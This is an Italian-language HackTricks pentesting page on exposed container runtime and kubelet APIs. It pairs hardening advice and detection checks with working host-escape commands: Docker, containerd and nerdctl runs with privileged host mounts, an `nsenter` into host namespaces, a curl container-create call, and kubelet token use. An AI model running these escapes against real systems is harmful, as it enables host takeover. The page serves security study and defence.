# Runtime API And Daemon Exposure

{{#include ../../../banners/hacktricks-training.md}}

## Overview

Molti compromissioni reali di container non iniziano affatto con un namespace escape. Iniziano con l'accesso al control plane del runtime. Se un workload può comunicare con `dockerd`, `containerd`, CRI-O, Podman, o kubelet tramite un Unix socket montato o un listener TCP esposto, l'attaccante può essere in grado di richiedere un nuovo container con privilegi migliori, montare il filesystem dell'host, unirsi ai namespace dell'host, o recuperare informazioni sensibili del nodo. In quei casi, la runtime API è il vero confine di sicurezza, e comprometterla è funzionalmente vicino a compromettere l'host.

Ecco perché l'esposizione del runtime socket dovrebbe essere documentata separatamente dalle protezioni del kernel. Un container con seccomp, capabilities, e confinamento MAC ordinari può comunque essere a una sola API call dal compromettere l'host se `/var/run/docker.sock` o `/run/containerd/containerd.sock` sono montati al suo interno. L'isolamento del kernel del container attuale può funzionare esattamente come progettato mentre il management plane del runtime rimane completamente esposto.

## Daemon Access Models

Docker Engine espone tradizionalmente la sua privileged API tramite il Unix socket locale su `unix:///var/run/docker.sock`. Storicamente è stato esposto anche in remoto tramite listener TCP come `tcp://0.0.0.0:2375` o un listener protetto da TLS su `2376`. Esporre il daemon in remoto senza TLS forte e autenticazione client trasforma di fatto la Docker API in un'interfaccia root remota.

containerd, CRI-O, Podman, e kubelet espongono superfici simili ad alto impatto. I nomi e i workflow differiscono, ma la logica no. Se l'interfaccia consente al chiamante di creare workload, montare percorsi dell'host, recuperare credenziali, o alterare container in esecuzione, l'interfaccia è un canale di management privilegiato e dovrebbe essere trattata di conseguenza.

I percorsi locali comuni da controllare sono:
```text
/var/run/docker.sock
/run/docker.sock
/run/containerd/containerd.sock
/var/run/crio/crio.sock
/run/podman/podman.sock
/var/run/kubelet.sock
/run/buildkit/buildkitd.sock
/run/firecracker-containerd.sock
```
Stack più vecchi o più specializzati possono esporre anche endpoint come `dockershim.sock`, `frakti.sock` o `rktlet.sock`. Sono meno comuni negli ambienti moderni, ma quando li incontri vanno trattati con la stessa cautela perché rappresentano superfici di controllo del runtime piuttosto che normali socket applicativi.

## Secure Remote Access

Se un daemon deve essere esposto oltre il socket locale, la connessione dovrebbe essere protetta con TLS e preferibilmente con autenticazione reciproca, così il daemon verifica il client e il client verifica il daemon. La vecchia abitudine di aprire il Docker daemon su HTTP in chiaro per comodità è uno degli errori più pericolosi nell'amministrazione dei container perché la superficie API è abbastanza potente da creare direttamente container privilegiati.

Il pattern storico di configurazione Docker era simile a:
```bash
DOCKER_OPTS="-H unix:///var/run/docker.sock -H tcp://192.168.56.101:2376"
sudo service docker restart
```
Su host basati su systemd, la comunicazione del daemon può anche apparire come `fd://`, il che significa che il processo eredita da systemd un socket già aperto invece di fare il binding direttamente da solo. La lezione importante non è la sintassi esatta, ma la conseguenza di sicurezza. Nel momento in cui il daemon ascolta oltre un socket locale con permessi stretti, la sicurezza del trasporto e l'autenticazione del client diventano obbligatorie invece che hardening opzionale.

## Abuse

Se è presente un runtime socket, conferma quale sia, se esiste un client compatibile e se l'accesso raw HTTP o gRPC è possibile:
```bash
find / -maxdepth 3 \( -name docker.sock -o -name containerd.sock -o -name crio.sock -o -name podman.sock -o -name kubelet.sock \) 2>/dev/null
ss -xl | grep -E 'docker|containerd|crio|podman|kubelet' 2>/dev/null
docker -H unix:///var/run/docker.sock version 2>/dev/null
podman --url unix:///run/podman/podman.sock info 2>/dev/null
nerdctl --address /run/containerd/containerd.sock --namespace k8s.io ps 2>/dev/null
ctr --address /run/containerd/containerd.sock images ls 2>/dev/null
crictl --runtime-endpoint unix:///run/containerd/containerd.sock ps 2>/dev/null
crictl --runtime-endpoint unix:///var/run/crio/crio.sock ps 2>/dev/null
buildctl --addr unix:///run/buildkit/buildkitd.sock debug workers 2>/dev/null
```
Questi comandi sono utili perché distinguono tra un path morto, un socket montato ma inaccessibile e una live privileged API. Se il client ha successo, la domanda successiva è se l'API possa avviare un nuovo container con un host bind mount o con condivisione dell'host namespace.

### When No Client Is Installed

L'assenza di `docker`, `podman` o di un altro CLI friendly non significa che il socket sia safe. Docker Engine parla HTTP tramite il suo Unix socket, e Podman espone sia una Docker-compatible API sia una Libpod-native API tramite `podman system service`. Questo significa che un ambiente minimale con solo `curl` può ancora essere sufficiente per pilotare il daemon:
```bash
curl --unix-socket /var/run/docker.sock http://localhost/_ping
curl --unix-socket /var/run/docker.sock http://localhost/v1.54/images/json
curl --unix-socket /var/run/docker.sock \
-H 'Content-Type: application/json' \
-d '{"Image":"ubuntu:24.04","Cmd":["id"],"HostConfig":{"Binds":["/:/host"]}}' \
-X POST http://localhost/v1.54/containers/create

curl --unix-socket /run/podman/podman.sock http://d/_ping
curl --unix-socket /run/podman/podman.sock http://d/v1.40.0/images/json
```
Questo è importante durante il post-exploitation perché a volte i difensori rimuovono i normali binari client ma lasciano montata la management socket. Su host Podman, ricorda che il path ad alto valore differisce tra deployment rootful e rootless: `unix:///run/podman/podman.sock` per le istanze di servizio rootful e `unix://$XDG_RUNTIME_DIR/podman/podman.sock` per quelle rootless.

### Full Example: Docker Socket To Host Root

Se `docker.sock` è raggiungibile, l'escape classico è avviare un nuovo container che monta il filesystem root dell'host e poi fare `chroot` al suo interno:
```bash
docker -H unix:///var/run/docker.sock images
docker -H unix:///var/run/docker.sock run --rm -it -v /:/host ubuntu:24.04 chroot /host /bin/bash
```
Questo fornisce esecuzione diretta come host-root tramite il Docker daemon. L'impatto non è limitato alla lettura dei file. Una volta dentro il nuovo container, l'attaccante può alterare i file dell'host, raccogliere credenziali, installare persistence o avviare ulteriori workload privilegiati.

### Full Example: Docker Socket To Host Namespaces

Se l'attaccante preferisce l'accesso ai namespace invece del solo accesso al filesystem:
```bash
docker -H unix:///var/run/docker.sock run --rm -it --pid=host --privileged ubuntu:24.04 bash
nsenter --target 1 --mount --uts --ipc --net --pid -- bash
```
Questo percorso raggiunge l'host chiedendo al runtime di creare un nuovo container con esposizione esplicita del host-namespace invece che sfruttando quello attuale.

### Esempio completo: containerd Socket

Un `containerd` socket montato è di solito altrettanto pericoloso:
```bash
ctr --address /run/containerd/containerd.sock images pull docker.io/library/busybox:latest
ctr --address /run/containerd/containerd.sock run --tty --privileged --mount type=bind,src=/,dst=/host,options=rbind:rw docker.io/library/busybox:latest host /bin/sh
chroot /host /bin/sh
```
Se è presente un client più simile a Docker, `nerdctl` può essere più comodo di `ctr` perché espone flag familiari come `--privileged`, `--pid=host` e `-v`:
```bash
nerdctl --address /run/containerd/containerd.sock --namespace k8s.io run --rm -it \
--privileged --pid=host -v /:/host docker.io/library/alpine:latest sh
chroot /host /bin/sh
```
L'impatto è di nuovo il compromesso dell'host. Anche se manca il tooling specifico di Docker, un'altra runtime API può comunque offrire lo stesso potere amministrativo. Sui nodi Kubernetes, `crictl` può anche essere sufficiente per reconnaissance e interazione con i container perché parla direttamente con l'endpoint CRI.

### BuildKit Socket

`buildkitd` è facile da trascurare perché spesso viene considerato "solo il backend di build", ma il daemon è comunque un control plane privilegiato. Un `buildkitd.sock` raggiungibile può consentire a un attacker di eseguire step di build arbitrari, ispezionare le capacità dei worker, usare context locali dall'ambiente compromesso e richiedere entitlements pericolosi come `network.host` o `security.insecure` quando il daemon è stato configurato per consentirli.

Le prime interazioni utili sono:
```bash
buildctl --addr unix:///run/buildkit/buildkitd.sock debug workers
buildctl --addr unix:///run/buildkit/buildkitd.sock du
```
Se il daemon accetta richieste di build, verifica se sono disponibili entitlements non sicuri:
```bash
buildctl --addr unix:///run/buildkit/buildkitd.sock build \
--frontend dockerfile.v0 \
--local context=. \
--local dockerfile=. \
--allow network.host \
--allow security.insecure \
--output type=local,dest=/tmp/buildkit-out
```
L'impatto esatto dipende dalla configurazione del daemon, ma un servizio BuildKit rootful con entitlements permissivi non è una semplice comodità per sviluppatori. Trattalo come un'altra superficie amministrativa ad alto valore, specialmente su CI runners e nodi di build condivisi.

### Kubelet API Over TCP

Il kubelet non è un container runtime, ma fa comunque parte del piano di gestione del nodo e spesso rientra nella stessa discussione sul trust boundary. Se la porta sicura del kubelet `10250` è raggiungibile dal workload, oppure se credenziali del nodo, kubeconfigs o diritti di proxy sono esposti, l'attaccante può essere in grado di enumerare i Pods, recuperare i log o eseguire comandi in container locali del nodo senza mai toccare il percorso di admission dell'API server di Kubernetes.

Inizia con discovery a basso costo:
```bash
curl -sk https://127.0.0.1:10250/pods
curl -sk https://127.0.0.1:10250/runningpods/
TOKEN=$(cat /var/run/secrets/kubernetes.io/serviceaccount/token 2>/dev/null)
curl -sk -H "Authorization: Bearer $TOKEN" https://127.0.0.1:10250/pods
```
Se il percorso proxy del kubelet o dell'API-server autorizza `exec`, un client compatibile con WebSocket può trasformarlo in esecuzione di codice in altri container sul nodo. Questo è anche il motivo per cui `nodes/proxy` con sola permission `get` è più pericoloso di quanto sembri: la request può comunque raggiungere endpoint del kubelet che eseguono comandi, e quelle interazioni dirette con il kubelet non compaiono nei normali log di audit di Kubernetes.

## Checks

L'obiettivo di questi checks è rispondere se il container può raggiungere qualsiasi management plane che sarebbe dovuto rimanere fuori dal trust boundary.
```bash
find / -maxdepth 3 \( -name docker.sock -o -name containerd.sock -o -name crio.sock -o -name podman.sock -o -name kubelet.sock \) 2>/dev/null
mount | grep -E '/var/run|/run|docker.sock|containerd.sock|crio.sock|podman.sock|kubelet.sock'
ss -lntp 2>/dev/null | grep -E ':2375|:2376'
env | grep -E 'DOCKER_HOST|CONTAINERD_ADDRESS|CRI_CONFIG_FILE|BUILDKIT_HOST|XDG_RUNTIME_DIR'
find /run /var/run -maxdepth 3 \( -name 'buildkitd.sock' -o -name 'podman.sock' \) 2>/dev/null
```
Cosa è interessante qui:

- Un runtime socket montato è di solito un'primitive amministrativa diretta piuttosto che una semplice disclosure di informazioni.
- Un listener TCP su `2375` senza TLS dovrebbe essere trattato come una condizione di remote-compromise.
- Variabili di ambiente come `DOCKER_HOST` spesso rivelano che il workload è stato progettato intenzionalmente per parlare con il runtime dell'host.

## Runtime Defaults

| Runtime / platform | Default state | Default behavior | Common manual weakening |
| --- | --- | --- | --- |
| Docker Engine | Local Unix socket by default | `dockerd` ascolta sul socket locale e il daemon è di solito rootful | mounting `/var/run/docker.sock`, exposing `tcp://...:2375`, weak or missing TLS on `2376` |
| Podman | Daemonless CLI by default | Non è richiesto alcun daemon privilegiato a lunga durata per l'uso locale ordinario; le API sockets possono comunque essere esposte quando `podman system service` è abilitato | exposing `podman.sock`, running the service broadly, rootful API use |
| containerd | Local privileged socket | L'API amministrativa è esposta tramite il socket locale e di solito consumata da strumenti di livello superiore | mounting `containerd.sock`, broad `ctr` or `nerdctl` access, exposing privileged namespaces |
| CRI-O | Local privileged socket | L'endpoint CRI è pensato per componenti trusted locali del node | mounting `crio.sock`, exposing the CRI endpoint to untrusted workloads |
| Kubernetes kubelet | Node-local management API | Kubelet non dovrebbe essere raggiungibile in modo ampio dai Pods; l'accesso può esporre stato dei pod, credenziali e funzionalità di execution a seconda di authn/authz | mounting kubelet sockets or certs, weak kubelet auth, host networking plus reachable kubelet endpoint |

## References

- [containerd socket exploitation part 1](https://thegreycorner.com/2025/02/12/containerd-socket-exploitation-part-1.html)
- [Kubernetes API Server Bypass Risks](https://kubernetes.io/docs/concepts/security/api-server-bypass-risks/)
{{#include ../../../banners/hacktricks-training.md}}
